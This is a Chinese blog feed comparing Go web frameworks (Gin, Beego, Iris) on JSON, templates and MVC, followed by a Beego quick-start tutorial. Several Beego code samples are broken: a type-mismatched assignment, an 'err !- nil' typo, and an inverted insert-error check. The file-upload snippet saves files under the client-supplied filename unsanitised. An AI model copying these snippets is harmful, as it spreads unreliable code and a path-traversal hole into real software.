id="BeeGo-2"><a href="#BeeGo-2" class="headerlink" title="BeeGo"></a>BeeGo</h4><p>Beego 对与JSON 数据处理则比较复杂，如果接受数据则需要从 <code>context.RequestBody</code> 中取出数据，之后需要使用断言解析数据，实际上，这里的处理方式与原生的是一样的，并未进行功能优化：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> body <span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">_ = json.Unmarshal(ctx.Input.RequestBody, &amp;body) <span class="comment">// 将 json 数据解析到 body 变量中</span></span><br><span class="line">username := body[<span class="string">&quot;name&quot;</span>].(<span class="type">string</span>) <span class="comment">// 使用断言取出单个数据</span></span><br></pre></td></tr></table></figure><p>对于返回一个 json 数据，BeeGo 只是将我们创建的 json 结构对象存放于 <code>context.Data</code> 下的 <code>“json”</code> 字段中，然后调用 <code>context.ServeJSON()</code> 方法时，会去获取 <code>c.Data[&quot;json&quot;]</code> 下存放的结构然后将结果转换成 json 的数据格式并发送：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="type">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">    Age  <span class="type">int</span>    <span class="string">`json:&quot;age&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *TestController)</span></span> TestData() &#123;</span><br><span class="line">user := User&#123;</span><br><span class="line">Name: <span class="string">&quot;huahua&quot;</span>,</span><br><span class="line">Age:  <span class="number">18</span>,</span><br><span class="line">&#125;</span><br><span class="line">c.Data[<span class="string">&quot;json&quot;</span>] = user</span><br><span class="line">c.ServeJSON()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>起始在处理 json 这一步，Beego 只是做了非常简单的替换工作，<code>context.ServeJSON()</code> 的方法调用后，取到我们设置的结构体后调用了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(output *BeegoOutput)</span></span> JSON(data <span class="keyword">interface</span>&#123;&#125;, hasIndent <span class="type">bool</span>, encoding <span class="type">bool</span>) <span class="type">error</span></span><br></pre></td></tr></table></figure><p>该方法将结构体通过 <code>json.Marshal()</code> 转成了 json 格式，同时又为响应报文添加了相应响应数据格式信息，之后将数据送出。</p><p>此外，BeeGo 支持返回的数据类型由有：JSON、XML、JSONP</p><h4 id="Iris-1"><a href="#Iris-1" class="headerlink" title="Iris"></a>Iris</h4><p>Irisi 对处理 JSON 数据的方法进行了封装，同时也拥有验证数据的能力。</p><p>发送数据与前两者无差别，都是先定义结构体，然后底层使用 JSON 库的能力对 JSON 数据进行解析并赋值于创建的对象。</p><p>接收数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MyHandler</span><span class="params">(ctx iris.Context)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> c Company <span class="comment">// 定义结构体省略</span></span><br><span class="line">    <span class="keyword">if</span> err := ctx.ReadJSON(&amp;c); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        ctx.StatusCode(iris.StatusBadRequest)</span><br><span class="line">        ctx.WriteString(err.Error())</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    ctx.Writef(<span class="string">&quot;Received: %#+v\n&quot;</span>, c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在对于返回数据的处理上，与 Gin 相似，采用了在 <code>iris.Context.JSON()</code> 方法可以将对象转化为 JSON 数据输出。</p><p>返回数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app.Get(<span class="string">&quot;/encode&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx iris.Context)</span></span> &#123;</span><br><span class="line">    peter := User&#123;</span><br><span class="line">        Firstname: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">        Lastname:  <span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">        City:      <span class="string">&quot;Neither FBI knows!!!&quot;</span>,</span><br><span class="line">        Age:       <span class="number">25</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//手动设置内容类型: ctx.ContentType(&quot;application/javascript&quot;)</span></span><br><span class="line">    ctx.JSON(peter)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><a href="https://studyiris.com/example/responseWriter/writeRest.html">引用来源</a></p><p>此外，Iris 支持返回的数据格式有：binary, text, json, jsonp, xml, markdown</p><h2 id="2-5-模板引擎"><a href="#2-5-模板引擎" class="headerlink" title="2.5 模板引擎"></a>2.5 模板引擎</h2><h4 id="原生-1"><a href="#原生-1" class="headerlink" title="原生"></a>原生</h4><p>Go web 能力中包含了模板引擎的支持，可以使用 <code>template</code> 包来进行模板处理，使用类似 <code>Parse</code>、<code>ParseFile</code>、<code>Execute</code> 等方法从文件或者字符串加载模板，然后执行类似下图展示的模板的 merge 操作：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTAvMTEvUEtnYnNWYW0xUXkzd0ZwLnBuZw?x-oss-process=image/format,png" alt=""></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    t := template.New(<span class="string">&quot;some template&quot;</span>) <span class="comment">// 创建一个模板</span></span><br><span class="line">    t, _ = t.ParseFiles(<span class="string">&quot;tmpl/welcome.html&quot;</span>)  <span class="comment">// 解析模板文件</span></span><br><span class="line">    user := GetUser() <span class="comment">// 获取当前用户信息</span></span><br><span class="line">    t.Execute(w, user)  <span class="comment">// 执行模板的 merger 操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原生的模板引擎支持以下的能力：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- 字段操作：`&#123;&#123;.&#125;&#125;`</span><br><span class="line">- 数据遍历： `&#123;&#123;with …&#125;&#125;…&#123;&#123;end&#125;&#125;`  `&#123;&#123;range …&#125;&#125;&#123;&#123;end&#125;&#125;`</span><br><span class="line">- 条件处理：`if ... else ...`</span><br><span class="line">- 管道符 （基于模板函数）</span><br><span class="line">- 模板函数</span><br><span class="line">- 模板变量</span><br><span class="line">- Must 操作：作用是检测模板是否正确，例如大括号是否匹配，注释是否正确的关闭，变量是否正确的书写。</span><br><span class="line"></span><br><span class="line">- 嵌套模板</span><br></pre></td></tr></table></figure><p><a href="https://learnku.com/docs/build-web-application-with-golang/074-template-processing/3198">引用来源</a></p><h4 id="Gin-3"><a href="#Gin-3" class="headerlink" title="Gin"></a>Gin</h4><p>Gin 可以通过配置 <code>LoadHTMLGlob()</code> 或者 <code>LoadHTMLFiles()</code> 启用模板渲染，这两个方法挂载与 <code>gin.Defalut()</code> 生成的 router 对象上，用于设置，模板目录 。匹配完成后可以调用 <code>Context.HTML</code> 进行渲染和数据注入。</p><p>同时，与原生不同的是，Gin 可以使用 <code>gin.H()</code> 来向模板注入 json 格式的数据，而不需要创建额外的结构体。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.LoadHTMLGlob(<span class="string">&quot;templates/*&quot;</span>)</span><br><span class="line"><span class="comment">//router.LoadHTMLFiles(&quot;templates/template1.html&quot;, &quot;templates/template2.html&quot;)</span></span><br><span class="line">router.GET(<span class="string">&quot;/index&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(http.StatusOK, <span class="string">&quot;index.tmpl&quot;</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;title&quot;</span>: <span class="string">&quot;Main website&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">router.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Gin 的模板引擎支持以下能力：</p><ul><li>使用自定义的 html 模板渲染</li><li>自定义分隔符（模板标签）</li><li>继承原生能力</li></ul><p>相比原生，Gin 定义模板的方式是采用创建全局模板对象（LoadHTMLGlob），然后在上下文对象中使用 <code>c.HTML</code> 去直接调用模板路径下的文件渲染模板。而原生则是在路由的上下文对象中创建 Template 对象，然后在上下文对象中渲染 Template 对象完成渲染工作。</p><p><a href="https://gin-gonic.com/zh-cn/docs/examples/html-rendering/">引用来源</a></p><h4 id="Beego"><a href="#Beego" class="headerlink" title="Beego"></a>Beego</h4><p>beego 的模板处理引擎采用的是 Go 内置的 <code>html/template</code> 包进行处理，而且 beego 的模板处理逻辑是采用了缓存编译方式，也就是所有的模板会在 beego 应用启动的时候全部编译然后缓存在 map 里面，Beego 的模板引擎支持以下能力：</p><ul><li>自定义模板目录</li><li>自动渲染</li><li>自定义模板标签</li><li>模板数据：模板中的数据是通过在 Controller 中 <code>this.Data</code> 获取的</li><li>自定义模板名称</li><li>layout 设计、LayoutSection：实际上是模板的组合、嵌套</li><li>renderform</li></ul><p><a href="https://beego.me/docs/mvc/view/view.md">引用来源</a></p><h4 id="Iris-2"><a href="#Iris-2" class="headerlink" title="Iris"></a>Iris</h4><p>Iris 自身并没有创建一种直接可用的模板引擎，而是交给用户可以选择任意一种模板引擎，且完全兼容 html/template。</p><p>官方推荐使用 Hero 引擎，可以预编译<code>html</code>模板以获取代码，其拥有以下特性：</p><ul><li>高性能.</li><li>非常易用.</li><li>功能强大，支持模板继承和模板include.</li><li>自动编译.</li></ul><p><a href="https://github.com/shiyanhui/hero/blob/master/README_CN.md">Hero 文档</a></p><p>同时可以选用 quicktemplate 引擎，其拥有以下特性：</p><ol><li>非常快。 模板转换为Go代码然后编译</li><li><code>Quicktemplate</code>语法非常接近<code>Go</code> - 在开始使用<code>quicktemplate</code>之前无需学习另一种模板语言</li><li>在模板编译期间几乎所有错误都被捕获，因此生产受模板相关错误的影响较小</li><li>使用方便。有关详细信息，请参阅快速入门和示例</li><li>强大。任意<code>Go</code>代码可以嵌入到模板中并与模板混合。小心这个功能 - 不要从模板中查询数据库<code>and/or</code>外部资源，除非你错过<code>Go</code>中的<code>PHP</code>方 式<code>:)</code>这种功能主要用于任意数据转换</li><li>易于使用的模板继承由<code>Go</code>接口提供支持。 请参阅此示例以获取详细信</li><li>模板被编译为单个二进制文件，因此无需将模板文件复制到服务器</li></ol><p><a href="https://github.com/valyala/fasttemplate">quicktemplate 文档</a></p><h2 id="2-6-MVC-架构"><a href="#2-6-MVC-架构" class="headerlink" title="2.6 MVC 架构"></a>2.6 MVC 架构</h2><h4 id="GIn"><a href="#GIn" class="headerlink" title="GIn"></a>GIn</h4><p>Gin 不支持 MVC 架构模式，需要开发者自行实现，具有一定的灵活性。</p><p><a href="https://github.com/mydevc/go-gin-mvc">Gin MVC 的实现参考</a></p><h4 id="Beego-1"><a href="#Beego-1" class="headerlink" title="Beego"></a>Beego</h4><p>Beego 是标准的 MVC 框架，对 MVC 有着良好的支持，同时提供了 Model 层的 ORM 引擎。</p><h4 id="Iris-3"><a href="#Iris-3" class="headerlink" title="Iris"></a>Iris</h4><p>Iris对MVC(模型视图控制器)模式有一流的支持，Iris web框架支持请求数据、模型、持久数据和以最快的速度执行的绑定。其模式流程图如下：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTAvMTEvdWkyVVJXUHdqU0tNZ0RKLnBuZw?x-oss-process=image/format,png" alt=""></p><p><a href="https://studyiris.com/doc/irisDoc/MoviesMVCApplication.html">Iris MVC 的实现参考</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 研究报告 </tag>
            
            <tag> Gin </tag>
            
            <tag> Beego </tag>
            
            <tag> Iris </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeeGo快速使用指南</title>
      <link href="/2019/09/46ad055bb090.html"/>
      <url>/2019/09/46ad055bb090.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-安装与使用"><a href="#1-安装与使用" class="headerlink" title="1. 安装与使用"></a>1. 安装与使用</h1><p>test test</p><h2 id="1-1-安装Bee"><a href="#1-1-安装Bee" class="headerlink" title="1.1 安装Bee"></a>1.1 安装Bee</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/astaxie/beego</span><br><span class="line">go get -u github.com/astaxie/beego</span><br><span class="line">go get -u github.com/beego/bee</span><br></pre></td></tr></table></figure><h2 id="1-2-创建一个Bee项目"><a href="#1-2-创建一个Bee项目" class="headerlink" title="1.2 创建一个Bee项目"></a>1.2 创建一个Bee项目</h2><p>创建一个标准的 Bee 项目：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bee new myproject</span><br></pre></td></tr></table></figure><p>创建一个 api 应用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bee api apiproject</span><br></pre></td></tr></table></figure><p>创建一个标准的 Bee 项目的目录结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">├─conf</span><br><span class="line">├─controllers</span><br><span class="line">├─models</span><br><span class="line">├─routers</span><br><span class="line">├─static</span><br><span class="line">│  ├─css</span><br><span class="line">│  ├─img</span><br><span class="line">│  └─js</span><br><span class="line">├─tests</span><br><span class="line">└─views</span><br></pre></td></tr></table></figure><h2 id="1-3-启动"><a href="#1-3-启动" class="headerlink" title="1.3 启动"></a>1.3 启动</h2><p>在本地以开发模式启动应用：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bee run</span><br></pre></td></tr></table></figure><h1 id="2-Router"><a href="#2-Router" class="headerlink" title="2. Router"></a>2. Router</h1><h2 id="2-1-默认访问"><a href="#2-1-默认访问" class="headerlink" title="2.1 默认访问"></a>2.1 默认访问</h2><p>在 <code>mian.go</code> 中引入路由系统：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// main.go</span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line"><span class="addition">+   _ &quot;Bee-Study/quickstart/routers&quot;</span></span><br><span class="line">&quot;github.com/astaxie/beego&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">beego.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在 Controller 层创建对应的 Controller 逻辑：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// controllers/default.go</span></span><br><span class="line"><span class="keyword">package</span> controllers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/astaxie/beego&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MainController <span class="keyword">struct</span> &#123;</span><br><span class="line">beego.Controller</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *MainController)</span></span> Get() &#123;</span><br><span class="line">c.Ctx.WriteString(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将路由文件创建于 routers 目录下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// routers/router.go</span></span><br><span class="line"><span class="keyword">package</span> routers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;Bee-Study/quickstart/controllers&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/astaxie/beego&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    beego.Router(<span class="string">&quot;/&quot;</span>, &amp;controllers.MainController&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们访问 <code>localhost:prot/</code> 时就会触发 Controller 层的逻辑， 由于浏览器发送的是 GET 请求，所以就会触发 <code>MainController</code> 的 <code>Get()</code> 方法，输出 <code>hello</code>。</p><h2 id="2-2-不同路由匹配不同方法"><a href="#2-2-不同路由匹配不同方法" class="headerlink" title="2.2 不同路由匹配不同方法"></a>2.2 不同路由匹配不同方法</h2><p>由于我们在 MainController 中定义了默认的 Get 方法，所以所有指向 MainController 的路由只要发送 Get 请求就会触发 MainController  的 <code>Get()</code> 方法。但通常我们都希望一个 Controller 对象可以处理多个路由请求，所以我们在调用 <code>beego.Router</code> 时可以传入第三个参数，即让当前匹配的路由可以在对应的请求方式下，触发 Controller 对象下的某一方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// router.go</span></span><br><span class="line">beego.Router(<span class="string">&quot;/test&quot;</span>, &amp;controllers.MainController&#123;&#125;, <span class="string">&quot;get:handleTest&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// controller.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *MainController)</span></span> handleTest()&#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-Controller"><a href="#3-Controller" class="headerlink" title="3. Controller"></a>3. Controller</h1><h2 id="3-1-创建一个-Controller"><a href="#3-1-创建一个-Controller" class="headerlink" title="3.1 创建一个 Controller"></a>3.1 创建一个 Controller</h2><p>Controller 主要负责逻辑控制，通过上一节我们已经创建除了一个简单的 Controller。Controller 不需要在 <code>main.go</code> 中挂载，只需要在对应的 Router 下使用对应的 Controller 即可。</p><p>创建一个 Controller 我们要继承一个 <code>beego.Controller</code> 对象：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> MainController <span class="keyword">struct</span> &#123;</span><br><span class="line">beego.Controller</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后我们可以复写其 <code>Get()</code> 方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *MainController)</span></span> Get() &#123;</span><br><span class="line">c.Data[<span class="string">&quot;Website&quot;</span>] = <span class="string">&quot;beego.me&quot;</span></span><br><span class="line">c.Data[<span class="string">&quot;Email&quot;</span>] = <span class="string">&quot;astaxie@gmail.com&quot;</span></span><br><span class="line">c.TplName = <span class="string">&quot;index.tpl&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-2-Controller-对象"><a href="#3-2-Controller-对象" class="headerlink" title="3.2 Controller 对象"></a>3.2 Controller 对象</h2><p>一个 <code>beeg.Controller</code> 类型的实例上挂载了如下的常用属性：</p><ul><li><p><strong>Data：</strong> 向 Template 中传入的数据</p></li><li><p><strong>TplName：</strong>  vies 文件目录下的模板名称</p></li><li><p><strong>Ctx：</strong> 上下文对象</p><ul><li><strong>Ctx.WriteString(content)：</strong> 返回内容</li></ul></li><li><p><strong>Redirect(url, code)：</strong> 重定向 </p><blockquote><p>c.Redirect(“/register”, 302)</p></blockquote></li><li><p><strong>GetString(key)：</strong> 获取 post 数据</p><blockquote><p>name := c.GetString(“userName”)</p></blockquote></li><li><p><strong>GetFile(key)：</strong>获取文件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f, h, err := c.GetFile(“uploadname”)</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line"><span class="keyword">if</span> err !- <span class="literal">nil</span>&#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    c.SaveToFile(<span class="string">&quot;uploadname&quot;</span>, <span class="string">&quot;./static/img&quot;</span> + h.Filename)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="4-ORM"><a href="#4-ORM" class="headerlink" title="4. ORM"></a>4. ORM</h1><h2 id="4-1-创建一个Model"><a href="#4-1-创建一个Model" class="headerlink" title="4.1 创建一个Model"></a>4.1 创建一个Model</h2><p>Bee 自带一个ORM框架，如果未下载需要手动安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ go get github.com/astaxie/beego/orm</span><br></pre></td></tr></table></figure><p>如果我们要连接 Mysql 数据库，则需要另外安装驱动：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ go get github.com/go-sql-driver/mysql</span><br></pre></td></tr></table></figure><p>之后我们在 <code>/models/model.go</code> 文件中需要引入 orm 与 mysql 驱动：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// model.go</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/astaxie/beego/orm&quot;</span></span><br><span class="line">_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>之后定义一个数据库模型：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// model.go</span></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Id   <span class="type">int</span></span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Pwd  <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个 init() 函数，在整个程序运行初始化时自动创建定义的数据库：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// model.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 连接数据库 参数：别名、数据库类型、连接uri</span></span><br><span class="line">_ = orm.RegisterDataBase(<span class="string">&quot;default&quot;</span>, <span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;root:root@tcp(localhost:3306)/beego_study?charset=utf8&quot;</span>)</span><br><span class="line">    <span class="comment">// 注册 Model</span></span><br><span class="line">orm.RegisterModel(<span class="built_in">new</span>(User))</span><br><span class="line"><span class="comment">// 创建表 参数：别名、更改字段后是否重新创建、是否显示创建过程</span></span><br><span class="line">_ = orm.RunSyncdb(<span class="string">&quot;default&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后不要忘记在 <code>mian.go</code> 中加载 models：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mian.go</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">_ <span class="string">&quot;Bee-Study/quickstart/models&quot;</span></span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="4-2-ORM-的基本操作"><a href="#4-2-ORM-的基本操作" class="headerlink" title="4.2 ORM 的基本操作"></a>4.2 ORM 的基本操作</h2><p>示例中的 <code>User</code> 为定义好的 Model 对象。如上述示例中我们在 models 包中创建的 <code>model.go</code> 文件中的 <code>User</code> 对象，其引入方式为 <code>models.User</code>。接下来的操作我们都是通过创建一个 ORM 对象来操作我们所创建的 Model 对象。</p><blockquote><p>对数据库的操作都是在 Controller 层完成的。</p></blockquote><h3 id="4-2-1-插入"><a href="#4-2-1-插入" class="headerlink" title="4.2.1 插入"></a>4.2.1 插入</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">o := orm.NewOrm()</span><br><span class="line"><span class="keyword">var</span> user User</span><br><span class="line">user.Name = <span class="string">&quot;slene&quot;</span></span><br><span class="line">user.Pwd= <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">id, err := o.Insert(&amp;user)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="comment">// fmt.Println(id)</span></span><br><span class="line">    beego.Info(<span class="string">&quot;插入失败&quot;</span>,err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2-2-查询"><a href="#4-2-2-查询" class="headerlink" title="4.2.2 查询"></a>4.2.2 查询</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">o := orm.NewOrm()</span><br><span class="line">user := User&#123;&#125;</span><br><span class="line">err := o.Read(&amp;user)</span><br></pre></td></tr></table></figure><p>也可以指定字段查询：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user := User&#123;Name: <span class="string">&quot;slene&quot;</span>&#125;</span><br><span class="line"><span class="comment">// 或者：user.name = &quot;slene&quot;</span></span><br><span class="line">err = o.Read(&amp;user, <span class="string">&quot;Name&quot;</span>)</span><br></pre></td></tr></table></figure><p>同时，可以使用 QuerySeter 